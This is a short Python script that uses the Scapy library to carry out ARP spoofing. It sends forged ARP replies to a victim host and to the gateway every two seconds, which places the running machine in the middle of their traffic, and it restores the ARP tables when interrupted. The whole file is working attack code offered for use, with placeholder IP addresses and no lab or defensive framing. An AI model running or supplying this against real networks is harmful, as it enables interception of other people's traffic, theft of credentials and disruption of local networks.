from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import time

def get_mac(ip):
    """
    Get the MAC address of the specified IP
    """
    answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=10)
    for sent, received in answered:
        return received.hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """
    Spoof the target IP address pretending to be the spoof IP address
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"Could not find MAC address for IP {target_ip}")
        return
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, spoof_ip):
    """
    Restore the network by reversing the ARP spoofing
    """
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(packet, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = "VICTIM_IP"
    gateway_ip = "GATEWAY_IP"
    
    try:
        print("Starting ARP spoofing. Press Ctrl+C to stop...")
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopping ARP spoofing and restoring network...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("Network restored.")
